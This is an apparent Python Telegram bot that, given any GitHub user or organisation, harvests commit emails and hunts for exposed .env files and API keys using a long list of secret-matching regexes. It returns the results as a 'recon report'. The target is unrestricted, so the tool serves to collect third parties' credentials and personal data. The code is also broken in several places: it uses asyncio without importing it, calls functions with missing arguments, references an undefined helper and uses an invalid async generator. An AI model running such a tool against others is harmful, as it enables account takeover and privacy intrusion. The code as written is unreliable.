import io
import json
import os
import re
import time
from datetime import datetime, timezone

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import (Application, CommandHandler, ContextTypes)

load_dotenv()
TG_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GH_TOKEN = os.getenv("GITHUB_TOKEN")

API = "https://api.github.com"
HEADERS = {
    "Accept": "application/vnd.github+json",
    "User-Agent": "gh-scraper-tgbot",
    "X-GitHub-Api-Version": "2022-11-28",
}
if GH_TOKEN:
    HEADERS["Authorization"] = f"Bearer {GH_TOKEN}"

# ---------------------------------------------------------------------------
# Patterns: env files + API credentials / AI tokens
# ---------------------------------------------------------------------------
ENV_FILENAMES = [
    ".env", ".env.local", ".env.development", ".env.production",
    ".env.staging", ".env.test", ".env.dev", ".env.prod",
    "config.env", ".flaskenv", "settings.env",
    "config.json", "config.yaml", "config.yml",
    "credentials.json", "secrets.json", "secrets.yaml",
    "firebase-adminsdk.json", "serviceAccountKey.json",
    ".npmrc", ".netrc", ".aws/credentials", "application.properties",
]

# filename: search queries for code search (auth required)
ENV_SEARCH_QUERIES = [
    'filename:.env', 'filename:.env.local', 'filename:.env.production',
    'filename:credentials.json', 'filename:serviceAccountKey.json',
    'filename:.npmrc', 'path:.aws filename:credentials',
]

SECRET_PATTERNS = {
    # --- AI provider keys ---
    "OpenAI Key":        re.compile(r"sk-(?:proj-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}"),
    "OpenAI (legacy)":   re.compile(r"\bsk-[A-Za-z0-9]{48}\b"),
    "Anthropic Key":     re.compile(r"sk-ant-(?:api)?[0-9A-Za-z_-]{20,}"),
    "Google AI/Gemini":  re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "Google OAuth":      re.compile(r"[0-9]+-[0-9a-z_]{32}\.apps\.googleusercontent\.com"),
    "Google Service Acct": re.compile(r'"type":\s*"service_account"'),
    "HuggingFace Token": re.compile(r"\bhf_[A-Za-z0-9]{34,}\b"),
    "Groq API Key":      re.compile(r"\bgsk_[A-Za-z0-9]{20,}\b"),
    "Cohere Token":      re.compile(r"\b[0-9a-f]{40}\b(?=.*[Cc]ohere)"),
    "Replicate Token":   re.compile(r"\br8_[A-Za-z0-9]{36,}\b"),
    "Mistral Key":       re.compile(r"\b(?:mistral|ms)-[0-9a-zA-Z]{32}\b"),
    "Together AI Key":   re.compile(r"\b[0-9a-f]{64}\b(?=.*together)", re.I),
    "DeepSeek Key":      re.compile(r"\bsk-(?:ds|deepseek)?[0-9a-f]{32}\b"),
    "xAI/Grok Key":      re.compile(r"\bxai-[A-Za-z0-9]{40,}\b"),
    "Perplexity Key":    re.compile(r"\bpplx-[A-Za-z0-9]{40,}\b"),
    "Stability AI Key":  re.compile(r"\bsk-[A-Za-z0-9]{48}(?=.*stability)", re.I),
    "OpenRouter Key":    re.compile(r"\bsk-or-v1-[0-9a-f]{64}\b"),

    # --- Cloud / infra ---
    "AWS Access Key":    re.compile(r"\b(?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16}\b"),
    "AWS Secret (ctx)":  re.compile(r"(?i)aws.{0,20}['\"][0-9a-zA-Z/+=]{40}['\"]"),
    "Azure Storage Key": re.compile(r"(?i)AccountKey=[A-Za-z0-9/+=]{88}"),
    "GCP API Key":       re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "DigitalOcean Token":re.compile(r"\bdop_v1_[0-9a-f]{64}\b"),
    "Stripe Key":        re.compile(r"\b[sr]k_live_[0-9a-zA-Z]{24,}\b"),
    "Twilio API Key":    re.compile(r"\bSK[0-9a-fA-F]{32}\b"),
    "Twilio SID":        re.compile(r"\bAC[a-zA-Z0-9]{32}\b"),
    "SendGrid Key":      re.compile(r"\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b"),
    "Mailgun Key":       re.compile(r"\bkey-[0-9a-zA-Z]{32}\b"),
    "Slack Token":       re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),
    "Slack Webhook":     re.compile(r"https://hooks\.slack\.com/services/T[A-Za-z0-9_]+/B[A-Za-z0-9_]+/[A-Za-z0-9]+"),
    "Telegram Bot Token":re.compile(r"\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b"),
    "Discord Bot Token": re.compile(r"\b[\w-]{24}\.[\w-]{6}\.[\w-]{27}\b"),
    "GitHub Token":      re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b"),
    "GitLab Token":      re.compile(r"\bglpat-[A-Za-z0-9_-]{20,}\b"),
    "NPM Token":         re.compile(r"\bnpm_[A-Za-z0-9]{36}\b"),
    "PyPI Token":        re.compile(r"\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]+"),
    "Heroku API Key":    re.compile(r"(?i)heroku.{0,25}[0-9a-f-]{36}"),
    "Shopify Token":     re.compile(r"\bshp(?:at|ca|pa)_[0-9a-fA-F]{32}\b"),
    "JWT":               re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}\b"),
    "Private Key":       re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----"),
    "Database URL":      re.compile(r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s'\"<>]{8,}"),
    "Generic Secret":    re.compile(r"(?i)(?:api[_-]?key|secret|token|passwd|password)\s*[:=]\s*['\"][A-Za-z0-9_\-/.+=]{8,}['\"]"),
}

# value patterns worth reporting inside dumped .env files
ENV_VALUE_PATTERNS = [
    (name, pat) for name, pat in SECRET_PATTERNS.items()
]

MAX_FILE_BYTES = 200_000  # don't scan huge files


# ---------------------------------------------------------------------------
# GitHub API helpers (async, rate-limit aware)
# ---------------------------------------------------------------------------
async def gh_get(client: httpx.AsyncClient, url: str, params: dict = None):
    """GET with rate-limit handling. Returns httpx.Response."""
    while True:
        r = await client.get(url, params=params)
        remaining = r.headers.get("X-RateLimit-Remaining")
        if remaining == "0":
            reset = int(r.headers.get("X-RateLimit-Reset", time.time() + 60))
            wait = max(reset - time.time(), 1)
            await asyncio.sleep(min(wait, 300))
            continue
        if r.status_code == 403 and "secondary rate limit" in r.text.lower():
            await asyncio.sleep(60)
            continue
        return r


async def gh_paginate(client, url, params=None, max_pages=20):
    params = dict(params or {})
    params.setdefault("per_page", 100)
    page = 1
    while page <= max_pages:
        params["page"] = page
        r = await gh_get(client, url, params)
        if r.status_code != 200:
            return
        items = r.json()
        if not items:
            return
        yield from items
        page += 1


def mk_client() -> httpx.AsyncClient:
    return httpx.AsyncClient(base_url=API, headers=HEADERS, timeout=30,
                             follow_redirects=True)


# ---------------------------------------------------------------------------
# Scan logic
# ---------------------------------------------------------------------------
def scan_text(text: str):
    """Return list of (pattern_name, snippet) matches in a text blob."""
    hits = []
    for name, pat in SECRET_PATTERNS.items():
        for m in pat.finditer(text):
            snippet = text[max(0, m.start() - 25):m.end() + 25].replace("\n", " ").strip()
            hits.append((name, snippet))
    return hits


def redact(snippet: str) -> str:
    """Partially redact secrets so the Telegram chat isn't a leak itself."""
    if len(snippet) > 40:
        return snippet[:18] + "…" + snippet[-6:]
    return snippet


async def get_profile(client, target):
    for kind in ("users", "orgs"):
        r = await gh_get(client, f"/{kind}/{target}")
        if r.status_code == 200:
            return r.json()
    return None


async def list_repos(client, target, is_org, max_repos=100):
    base = f"/orgs/{target}/repos" if is_org else f"/users/{target}/repos"
    repos = []
    async for repo in gh_paginate(client, base, {"type": "public", "sort": "updated"}):
        repos.append(repo)
        if len(repos) >= max_repos:
            break
    return repos


async def hunt_env_files(client, target, repos):
    """
    Two-phase .env hunt:
      1) code search for env-style filenames (auth-only, fast)
      2) raw fallback: try fetching common env file paths from every repo
         (works without code search; HEAD-based, cheap)
    Returns list of dicts: {repo, path, url, matches}
    """
    results = []
    seen = set()

    # --- Phase 1: code search ---
    if GH_TOKEN:
        for q in ENV_SEARCH_QUERIES:
            r = await gh_get(client, "/search/code",
                             {"q": f"{q} user:{target}", "per_page": 50})
            if r.status_code != 200:
                continue
            for item in r.json().get("items", []):
                key = (item["repository"]["full_name"], item["path"])
                if key in seen:
                    continue
                seen.add(key)
                raw = await gh_get(client, item["url"],
                                   {"Accept": "application/vnd.github.raw"})
                if raw.status_code != 200:
                    continue
                content = raw.text[:MAX_FILE_BYTES]
                hits = scan_text(content)
                results.append({
                    "repo": key[0], "path": key[1],
                    "url": f"https://github.com/{key[0]}/blob/HEAD/{key[1]}",
                    "hits": hits,
                })

    # --- Phase 2: raw-path brute force on default branch ---
    for repo in repos:
        branch = repo.get("default_branch", "main")
        for fname in ENV_FILENAMES:
            key = (repo["full_name"], fname)
            if key in seen:
                continue
            url = (f"{client.base_url}repos/{repo['full_name']}"
                   f"/contents/{fname}?ref={branch}")
            r = await gh_get(client, url)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and data.get("content"):
                import base64
                content = base64.b64decode(data["content"]).decode(
                    "utf-8", "ignore")[:MAX_FILE_BYTES]
                seen.add(key)
                hits = scan_text(content)
                results.append({
                    "repo": key[0], "path": fname,
                    "url": f"https://github.com/{key[0]}/blob/{branch}/{fname}",
                    "hits": hits,
                })
    return results


async def scan_repo_contents(client, repos, max_files_per_repo=15):
    """Scan repo file trees (recursive) for secret-looking content."""
    findings = []
    for repo in repos:
        r = await gh_get(client, f"/repos/{repo['full_name']}/git/trees/"
                                 f"{repo.get('default_branch', 'HEAD')}?recursive=1")
        if r.status_code != 200:
            continue
        tree = r.json().get("tree", [])
        # prioritize likely-credential files
        scored = sorted(tree, key=lambda e: (
            0 if re.search(r"(?i)(env|secret|credential|key|token|config|settings|\.pem|\.p12|\.db|\.sql|dump|backup)", e.get("path", "")) else 1
        ))
        count = 0
        for entry in scored:
            if count >= max_files_per_repo:
                break
            if entry.get("type") != "blob" or entry.get("size", 0) > MAX_FILE_BYTES:
                continue
            fr = await gh_get(client, f"/repos/{repo['full_name']}/contents/"
                                      f"{entry['path']}?ref={repo.get('default_branch', 'HEAD')}")
            if fr.status_code != 200:
                continue
            data = fr.json()
            if isinstance(data, dict) and data.get("content"):
                import base64
                content = base64.b64decode(data["content"]).decode("utf-8", "ignore")
                hits = scan_text(content)
                if hits:
                    findings.append({
                        "repo": repo["full_name"], "path": entry["path"],
                        "url": f"https://github.com/{repo['full_name']}/blob/{repo.get('default_branch','HEAD')}/{entry['path']}",
                        "hits": hits,
                    })
            count += 1
    return findings


async def harvest_emails(client, repos, max_commits_per_repo=100):
    emails = {}
    for repo in repos:
        count = 0
        async for commit in gh_paginate(client, f"/repos/{repo['full_name']}/commits"):
            if count >= max_commits_per_repo:
                break
            count += 1
            for who in ("author", "committer"):
                git_id = commit.get(who) or {}
                name, email = git_id.get("name"), git_id.get("email")
                if name and email and "noreply" not in email and "users.noreply" not in email:
                    emails.setdefault(email, {"name": name, "repos": set()})["repos"].add(repo["full_name"])
    return emails


def fmt_env_results(results):
    if not results:
        return "✅ No exposed env/config files found."
    lines = [f"🚨 Found {len(results)} exposed env/config file(s):\n"]
    for r in results[:15]:
        lines.append(f"📄 {r['repo']}/{r['path']}")
        lines.append(f"   {r['url']}")
        for name, snip in r["hits"][:6]:
            lines.append(f"   🔑 [{name}] {redact(snip)}")
        lines.append("")
    if len(results) > 15:
        lines.append(f"...and {len(results) - 15} more (see /report).")
    return "\n".join(lines)


def fmt_findings(findings, title):
    if not findings:
        return f"✅ No exposed secrets found ({title})."
    total = sum(len(f["hits"]) for f in findings)
    lines = [f"🚨 {title}: {total} potential secret(s) in {len(findings)} file(s):\n"]
    for f in findings[:15]:
        lines.append(f"📄 {f['repo']}/{f['path']}")
        for name, snip in f["hits"][:5]:
            lines.append(f"   🔑 [{name}] {redact(snip)}")
        lines.append(f"   {f['url']}\n")
    if len(findings) > 15:
        lines.append(f"...and {len(findings) - 15} more files (see /report).")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Telegram handlers
# ---------------------------------------------------------------------------
async def send_long(update: Update, text: str, parse_mode=None):
    for i in range(0, len(text), 4000):
        await update.message.reply_text(text[i:i + 4000], parse_mode=parse_mode)


async def cmd_scrape(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /scrape <user|org>")
        return
    target = ctx.args[0]
    await update.message.chat.send_action(ChatAction.TYPING)
    async with mk_client() as client:
        profile = await get_profile(client, target)
        if not profile:
            await update.message.reply_text(f"❌ '{target}' not found.")
            return
        is_org = profile.get("type") == "Organization"
        repos = await list_repos(client, target, is_org)
        lines = [f"👤 {profile.get('login')} ({profile.get('type')})",
                 f"Name: {profile.get('name', '—')}",
                 f"Location: {profile.get('location', '—')}",
                 f"Email: {profile.get('email', '—')}",
                 f"Blog: {profile.get('blog', '—')}",
                 f"Bio: {profile.get('bio', '—')}",
                 f"Public repos: {profile.get('public_repos')}",
                 f"Created: {profile.get('created_at', '')[:10]}\n",
                 f"📦 Latest repos ({len(repos)}):"]
        for repo in repos[:25]:
            lines.append(f"  • {repo['full_name']} ⭐{repo['stargazers_count']} "
                         f"[{repo.get('language')}] pushed {repo['pushed_at'][:10]}")
        await send_long(update, "\n".join(lines))


async def cmd_emails(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /emails <user|org>")
        return
    target = ctx.args[0]
    await update.message.chat.send_action(ChatAction.TYPING)
    async with mk_client() as client:
        profile = await get_profile(client, target)
        if not profile:
            await update.message.reply_text(f"❌ '{target}' not found.")
            return
        repos = await list_repos(client, profile.get("type") == "Organization")
        emails = await harvest_emails(client, repos)
        if not emails:
            await update.message.reply_text("✅ No commit emails found.")
            return
        lines = [f"📧 Found {len(emails)} unique email(s) in commit history:\n"]
        for email, info in list(emails.items())[:50]:
            lines.append(f"  {info['name']} <{email}>")
            lines.append(f"    ↳ {', '.join(sorted(info['repos']))[:80]}")
        await send_long(update, "\n".join(lines))


async def cmd_env(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /env <user|org>")
        return
    target = ctx.args[0]
    await update.message.chat.send_action(ChatAction.TYPING)
    await update.message.reply_text(f"🔎 Hunting .env/config files for '{target}'...")
    async with mk_client() as client:
        profile = await get_profile(client, target)
        if not profile:
            await update.message.reply_text(f"❌ '{target}' not found.")
            return
        repos = await list_repos(client, profile.get("type") == "Organization")
        results = await hunt_env_files(client, target, repos)
        await send_long(update, fmt_env_results(results))


async def cmd_keys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /keys <user|org>")
        return
    target = ctx.args[0]
    await update.message.chat.send_action(ChatAction.TYPING)
    await update.message.reply_text(f"🔎 Scanning code for API keys/tokens ('{target}')...")
    async with mk_client() as client:
        profile = await get_profile(client, target)
        if not profile:
            await update.message.reply_text(f"❌ '{target}' not found.")
            return
        repos = await list_repos(client, profile.get("type") == "Organization", max_repos=50)
        findings = await scan_repo_contents(client, repos)
        await send_long(update, fmt_findings(findings, "Secret scan"))


async def cmd_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /report <user|org>")
        return
    target = ctx.args[0]
    await update.message.chat.send_action(ChatAction.TYPING)
    await update.message.reply_text(f"🧪 Running full scan on '{target}' — this may take a while...")
    async with mk_client() as client:
        profile = await get_profile(client, target)
        if not profile:
            await update.message.reply_text(f"❌ '{target}' not found.")
            return
        is_org = profile.get("type") == "Organization"
        repos = await list_repos(client, is_org)
        env_results = await hunt_env_files(client, target, repos)
        findings = await scan_repo_contents(client, repos)
        emails = await harvest_emails(client, repos)
        report = {
            "target": target,
            "scanned_at": datetime.now(timezone.utc).isoformat(),
            "profile": profile,
            "repo_count": len(repos),
            "env_files": [{"repo": r["repo"], "path": r["path"], "url": r["url"],
                           "hits": r["hits"]} for r in env_files_safe(env_files_local := env_results)],
            "secret_findings": [{"repo": f["repo"], "path": f["path"],
                                 "url": f["url"], "hits": f["hits"]} for f in findings],
            "emails": {e: {"name": i["name"], "repos": sorted(i["repos"])}
                       for e, i in emails.items()},
        }
        buf = io.BytesIO(json.dumps(report, indent=2, default=str).encode())
        buf.name = f"github_scan_{target}.json"
        await update.message.reply_document(buf, filename=buf.name,
                                            caption=f"Full recon report: {target}")


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 GitHub Scraper Bot\n\n"
        "/scrape <user|org>  – profile + repos\n"
        "/emails <user|org>  – commit email harvest\n"
        "/env <user|org>     – exposed .env/config files\n"
        "/keys <user|org>    – API keys & tokens (AI incl.)\n"
        "/report <user|org>  – full scan + JSON file\n"
        "/help – this message"
    )


def main():
    if not TG_TOKEN:
        raise SystemExit("Set TELEGRAM_BOT_TOKEN in .env")
    app = Application.builder().token(TG_TOKEN).build()
    app.add_handler(CommandHandler("scrape", cmd_scrape))
    app.add_handler(CommandHandler("emails", cmd_emails))
    app.add_handler(CommandHandler("env", cmd_env))
    app.add_handler(CommandHandler("keys", cmd_keys))
    app.add_handler(CommandHandler("report", cmd_report))
    app.add_handler(CommandHandler(["help", "start"], cmd_help))
    print("[+] Bot running. Ctrl+C to stop.")
    app.run_polling()


if __name__ == "__main__":
    main()